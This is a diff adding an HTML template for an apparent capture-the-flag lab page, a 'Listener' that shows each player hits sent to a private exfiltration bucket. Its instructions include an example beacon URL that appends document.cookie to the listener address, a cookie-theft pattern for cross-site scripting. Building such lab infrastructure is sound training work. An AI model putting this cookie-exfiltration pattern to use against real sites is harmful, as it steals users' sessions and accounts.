@@ -1,0 +1,43 @@
+{% extends "base.html" %}
+{% block title %}Listener — vuln-services{% endblock %}
+{% block content %}
+<div class="page-head">
+  <h1>Listener</h1>
+  <p class="progress">your private exfil bucket · last 5 min · auto-refreshing</p>
+</div>
+
+<div class="desc">
+  <p>Point your payload's beacon at <strong>your</strong> address below. Only hits sent here
+  show up on this page — other players have their own bucket.</p>
+  <p><strong>In the victim's browser (the admin bot lives on the challenge network):</strong></p>
+  <pre class="sql">http://listener/l/{{ lid }}</pre>
+  <p><strong>From your own machine (manual test / <code>curl</code> / <code>ncat</code> reference):</strong></p>
+  <pre class="sql">http://localhost:8091/l/{{ lid }}</pre>
+  <p class="muted">Tack the stolen data onto the URL, e.g.
+  <code>http://listener/l/{{ lid }}/?c=${encodeURIComponent(document.cookie)}</code>.</p>
+</div>
+
+{% if error %}<div class="flash flash-error">{{ error }}</div>{% endif %}
+
+<div class="tablewrap">
+  <table>
+    <thead>
+      <tr><th>time</th><th>method</th><th>path / query</th><th>body</th><th>from</th></tr>
+    </thead>
+    <tbody>
+      {% for h in hits %}
+        <tr>
+          <td>{{ h.ts }}</td>
+          <td>{{ h.method }}</td>
+          <td>{{ h.path }}</td>
+          <td>{{ h.body }}</td>
+          <td>{{ h.remote }}</td>
+        </tr>
+      {% else %}
+        <tr><td colspan="5" class="muted">No hits in the last 5 minutes. Fire a payload at your address and watch here.</td></tr>
+      {% endfor %}
+    </tbody>
+  </table>
+</div>
+<script>setTimeout(function(){ location.reload(); }, 4000);</script>
+{% endblock %}
